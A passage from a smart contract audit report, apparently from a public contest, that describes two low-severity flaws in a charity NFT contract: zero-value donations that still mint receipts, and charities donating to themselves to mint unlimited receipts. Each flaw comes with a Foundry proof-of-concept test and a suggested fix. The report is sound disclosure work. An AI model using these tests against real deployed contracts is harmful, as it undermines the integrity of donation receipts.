```Solidity
function testZeroDonate() public {
        // Check initial token counter
        uint256 initialTokenCounter = charityContract.tokenCounter();

        // Donor donates to the charity zero Ether
        vm.prank(donor);
        charityContract.donate{value: 0}(charity);

        // Check that the NFT was minted
        uint256 newTokenCounter = charityContract.tokenCounter();
        assertEq(newTokenCounter, initialTokenCounter + 1);

        // Verify ownership of the NFT
        address ownerOfToken = charityContract.ownerOf(initialTokenCounter);
        assertEq(ownerOfToken, donor);

        // Verify that the zero donation was sent to the charity
        uint256 charityBalance = charity.balance;
        assertEq(charityBalance, 0);
    }
```

## Impact

Without a check for `msg.value`, users can call the function `donate` with zero ether and still `receive` an NFT.

## Tools Used

Manual code review.

## Recommendations

To address this vulnerability, you should add a check for msg.value in the donate function.

```Solidity
function donate(address charity) public payable {
  require(msg.value > 0,"Amount is O");
```

## <a id='L-02'></a>L-02. GivingThanks.donate(): Minitg unlimited number of NFT tokens by charity

_Submitted by [k3ysk1lls](https://profiles.cyfrin.io/u/undefined), [parmakhanm786](https://profiles.cyfrin.io/u/undefined). Selected submission by: [k3ysk1lls](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

A verified charity can use their donated funds to donate to themselves and receive `DonationReceipt` tokens in an almost unlimited quantity - limited by the sum of their gas costs vs balance.

## Vulnerability Details

There is no check that prevents a charity from donating to itself. Therefore, each charity can mint a `DonationReceipt` token as many times as it wants.

## Impact

The purpose of `DonationReceipt` tokens is to identify donors. However, allowing charities to make donations themselves makes the `DonationReceipt` obsolete. You don't really know if the address on the receipt actually donated eth to a charity.

## Tools Used

Run the following test in the `GivingThanks.t.sol` test contract.

```js
function testCharityCanMintNFT() public {
        vm.deal(charity, 20 ether);

        uint256 balanceBefore = charity.balance;
        uint256 initialTokenCounter = charityContract.tokenCounter();

        assertEq(initialTokenCounter, 0);

        vm.prank(charity);
        charityContract.donate{value: balanceBefore}(charity);

        uint256 balanceAfter = charity.balance;

        //gas neglected
        assert(balanceBefore == balanceAfter);
        assertEq(charityContract.tokenCounter(), initialTokenCounter + 1);
        assertEq(charityContract.ownerOf(initialTokenCounter), charity);
    }
```

## Recommendations

Depending on your policy, you may:

* prohibit any registered/verified charity from making donations
* prohibit any verified charity from making donations to itself.





    